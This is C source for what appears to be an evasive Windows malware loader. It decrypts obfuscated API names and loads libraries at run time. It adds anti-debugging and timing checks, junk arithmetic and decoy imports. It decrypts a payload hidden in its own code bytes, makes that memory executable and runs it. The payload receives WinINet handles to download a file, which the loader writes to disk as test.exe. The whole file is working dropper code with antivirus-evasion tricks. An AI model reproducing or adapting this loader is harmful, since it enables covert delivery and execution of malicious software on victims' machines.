#include "loader.h"

// #include "payload_enc.c"
#include "entropy_low.c"
#include "macro_enc.h"

// #include "dynamic_strings.c"



void DBGLG(char buf[], ...){
    #ifdef DEBUG_print
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}


// unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
void* args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};





HMODULE Kernel32Module = NULL;
HMODULE WininetModule = NULL;
HMODULE user32Module = NULL;
pCreateDesktopW _CreateDesktopW = NULL;
pSetThreadDesktop _SetThreadDesktop = NULL;
MessageBoxWFunc _MessageBoxW = NULL;
pVirtualProtect _VirtualProtect = NULL;
pCreateFileW _CreateFileW = NULL;
pWriteFile _WriteFile = NULL;
pInternetOpenW _InternetOpen = NULL;
pInternetOpenUrlA _InternetOpenUrlA = NULL;
pInternetReadFile _InternetReadFile = NULL;
pInternetCloseHandle _InternetCloseHandle = NULL;
pGetLastError _GetLastError = NULL;
pCreateThread _CreateThread = NULL;
pCloseHandle _CloseHandle = NULL;
pCloseDesktop _CloseDesktop = NULL;
pGetSystemTime _GetSystemTime = NULL;
pExitProcess _ExitProcess = NULL;

extern unsigned char _cMessageBoxW[16];
extern unsigned char _cVirtualProtect[16];
extern unsigned char _cCreateFileW[16];
extern unsigned char _cWriteFile[16];
extern unsigned char _cCloseHandle[16];
extern unsigned char _cGetSystemTime[16];
extern unsigned char _cInternetOpenW[16];
extern unsigned char _cInternetOpenUrlA[32];
extern unsigned char _cInternetReadFile[32];
extern unsigned char _cInternetCloseHandle[32];
extern unsigned char _cGetLastError[16];
extern unsigned char _cCreateDisktopW[16];
extern unsigned char _cSetThreadDesktop[32];
extern unsigned char _cCreateThread[16];
extern unsigned char _cCloseDesktop[16];
extern unsigned char _cExitProcess[16];
extern unsigned char _cRtlExitUserProcess[32];
extern unsigned char _cLdrLoadDll[16];
extern unsigned char _cRtlInitUnicodeString[32];
extern unsigned char _sKernelbase[32];
extern unsigned char _sWininet[32];
extern unsigned char _sUser32[32];
extern unsigned char _sNtdll[32];
extern unsigned char _sntdll_full_path[64];
extern unsigned char MasterKeyStrings[16];
extern unsigned char _MasterKeyPayload[16];

unsigned char cMessageBoxW[16];
unsigned char cVirtualProtect[16];
unsigned char cCreateFileW[16];
unsigned char cWriteFile[16];
unsigned char cCloseHandle[16];
unsigned char cGetSystemTime[16];
unsigned char cInternetOpenW[16];
unsigned char cInternetOpenUrlA[32];
unsigned char cInternetReadFile[32];
unsigned char cInternetCloseHandle[32];
unsigned char cGetLastError[16];
unsigned char cCreateDisktopW[16];
unsigned char cSetThreadDesktop[32];
unsigned char cCreateThread[16];
unsigned char cCloseDesktop[16];
unsigned char cExitProcess[16];
unsigned char cRtlExitUserProcess[32];
unsigned char cLdrLoadDll[16];
unsigned char cRtlInitUnicodeString[32];
unsigned char sKernelbase[32];
unsigned char sWininet[32];
unsigned char sUser32[32];
unsigned char sNtdll[32];
unsigned char sntdll_full_path[64];
unsigned char MasterKeyPayload[16];
/* FIXME: GetEnvironmentVariableA("WINDIR", buf, sz) instead of C:\\ */


volatile int mutex_setupWinApi = 0;
HDESK desktop;

DWORD WINAPI setupWinApi(){
    // DYNAMIC_RETURN;
    int x = 1;
    int y = 187;
    while (mutex_setupWinApi != 1){
        x = y * x & 4 % 6;
        CHECK_DBG;
        y = x * x;
    }
    _SetThreadDesktop(desktop);
    _MessageBoxW = (MessageBoxWFunc)(_GetProcAddress(user32Module, cMessageBoxW));
    _CloseDesktop = (pCloseDesktop)_GetProcAddress(user32Module, cCloseDesktop);
    _VirtualProtect = (pVirtualProtect)_GetProcAddress(Kernel32Module, cVirtualProtect);
    _CreateFileW = (pCreateFileW)_GetProcAddress(Kernel32Module, cCreateFileW);
    _WriteFile = (pWriteFile)_GetProcAddress(Kernel32Module, cWriteFile);
    // DYNAMIC_RETURN;
    _CloseHandle = (pCloseHandle)_GetProcAddress(Kernel32Module, cCloseHandle);
    _InternetOpen = (pInternetOpenW)_GetProcAddress(WininetModule, cInternetOpenW);
    _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, cInternetOpenUrlA);
    _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, cInternetReadFile);
    _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, cInternetCloseHandle);
    _ExitProcess = (pExitProcess)_GetProcAddressNative(cRtlExitUserProcess);
    _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,cGetLastError);

    x = y * x & 4 % 6;
    y = x * x;
    mutex_setupWinApi = 0;
    return x + y;
}

int pseudo_main(){
    // DYNAMIC_RETURN;
    payload_enc_asm;
    int sz = 0;
    payload p;
    DWORD threadId;
    #ifndef DEBUG
    #endif
    HANDLE threadHandle;
    unsigned char KeyList[176];
    DWORD junk[sizeof(PDWORD)];
        // FIXME Payload size hardcoded
    unsigned char exec_macro[PAYLOAD_LEN];
    unsigned char buf[200 * 1024];
    int x = 58;
    int y = 18;
    unsigned char* copyme[] = {_cExitProcess, _cCloseDesktop, _cMessageBoxW,
                                    _cVirtualProtect, _cCreateFileW,
                                    _cWriteFile, _cCloseHandle, _cInternetOpenW,
                                    _cInternetOpenUrlA, _cInternetOpenUrlA + 16,
                                    _cInternetReadFile, _cInternetReadFile + 16,
                                    _cInternetCloseHandle, _cInternetCloseHandle + 16,
                                    _cGetLastError, _cCreateDisktopW, _cSetThreadDesktop,
                                    _cSetThreadDesktop + 16, _cCreateThread, _cGetSystemTime,
                                    _cRtlExitUserProcess, _cRtlExitUserProcess + 16,
                                    _sKernelbase, _sKernelbase + 16, _sUser32, _sUser32 + 16,
                                    _sWininet, _sWininet + 16, _sNtdll, _sNtdll + 16,
                                    _sntdll_full_path, _sntdll_full_path + 16,
                                    _sntdll_full_path + 32, _sntdll_full_path + 48,
                                    _cLdrLoadDll, _cRtlInitUnicodeString,
                                    _cRtlInitUnicodeString + 16, _MasterKeyPayload};
    unsigned char* decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
                                    cVirtualProtect, cCreateFileW,
                                    cWriteFile, cCloseHandle, cInternetOpenW,
                                    cInternetOpenUrlA, cInternetOpenUrlA + 16,
                                    cInternetReadFile, cInternetReadFile + 16,
                                    cInternetCloseHandle, cInternetCloseHandle + 16,
                                    cGetLastError, cCreateDisktopW, cSetThreadDesktop,
                                    cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
                                    cRtlExitUserProcess, cRtlExitUserProcess + 16,
                                    sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
                                    sWininet, sWininet + 16, sNtdll, sNtdll + 16,
                                    sntdll_full_path, sntdll_full_path + 16,
                                    sntdll_full_path + 32, sntdll_full_path + 48,
                                    cLdrLoadDll, cRtlInitUnicodeString,
                                    cRtlInitUnicodeString + 16, MasterKeyPayload};
    #ifndef DEBUG
    TOMFOOLERY
    #endif

    INIT_CONST();
    KeyScheduler(MasterKeyStrings, KeyList);

    // FIXME: Change hardcoded i parameter every time you update decryptme
    for (int i = 0; i < sizeof(decryptme)/8; ++i){
        memcpy(decryptme[i], copyme[i], 16);
        Decrypt(decryptme[i], KeyList);
    }
    Kernel32Module = _LoadLibrary((LPWSTR)sKernelbase);
    WininetModule = _LoadLibrary((LPWSTR)sWininet);
    user32Module = _LoadLibrary((LPWSTR)sUser32);
    _CreateThread = (pCreateThread)_GetProcAddress(Kernel32Module, cCreateThread);
    _CreateDesktopW = (pCreateDesktopW)_GetProcAddress(user32Module, cCreateDisktopW);
    _SetThreadDesktop = (pSetThreadDesktop)_GetProcAddress(user32Module, cSetThreadDesktop);
    _GetSystemTime = (pGetSystemTime)_GetProcAddress(Kernel32Module, cGetSystemTime);
    #ifndef DEBUG
    RECORD_TIME
    #endif
    if (!_CreateThread){
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, 0);
        i = GdiplusStartup(NULL, NULL, NULL);
        RegisterClassW(NULL);
        CreateWindowExW(0, NULL, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
        ShowWindow(NULL, 0);
        UpdateWindow(NULL);
        CloseWindow(NULL);
        GdiplusShutdown((ULONG_PTR)NULL);
    }
    if ((threadHandle = _CreateThread(NULL, 0, setupWinApi, NULL, 0, &threadId)) == NULL){
        return -89;
    }
    if ((desktop = _CreateDesktopW(L"Lolers", NULL, NULL, 0, GENERIC_ALL, NULL)) == NULL){
        return -851;
    }
    mutex_setupWinApi = 1;
    while (mutex_setupWinApi == 1){
        x = y * x & 4 % 6;
        #ifndef DEBUG
        CHECK_TIME
        #endif
        y = x * x ^ 17;
    }
    _CloseHandle(threadHandle);
    _CloseDesktop(desktop);
    args[0] = _InternetOpen;
    args[1] = _InternetOpenUrlA;
    args[2] = _InternetReadFile;
    args[3] = _InternetCloseHandle;
    args[4] = buf;
    args[5] = &sz;
    HANDLE hFile = _CreateFileW(L"./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }
    // RANDOM_BYTE
    #ifndef DEBUG
    SHORT_JMP
    #endif
    KeyScheduler(MasterKeyPayload, KeyList);
    unsigned char* payload_ptr = (unsigned char*) pseudo_main + (0x53 - 0x26);
    // FIXME Payload offset hardcoded
    for (int i = 0, bi = 0; i < PAYLOAD_LEN/4*7;){
        i += 3;
        memcpy(exec_macro + bi, payload_ptr + i, 4);
        bi += 4;
        i += 4;
    }
    for (int i = 0; i < PAYLOAD_LEN; i += 16){
        Decrypt(exec_macro + i, KeyList);
    }
    #ifndef DEBUG
    CHECK_TIME
    #endif
    _VirtualProtect(exec_macro, PAYLOAD_LEN,PAGE_EXECUTE_READWRITE, (PDWORD)&junk);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p = (payload)(exec_macro);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p(args);
    DWORD bytesWritten;
    BOOL result = _WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
    if (!result) {
        _CloseHandle(hFile);
        return 1;
    }
    _CloseHandle(hFile);
    #ifdef DEBUG
    _MessageBoxW(NULL, L"OK", L"OK", MB_OK);
    #endif
    _ExitProcess(0);
    return x + y;
}

void WinMainCRTStartup(){
    // DYNAMIC_RETURN;
    pseudo_main();
}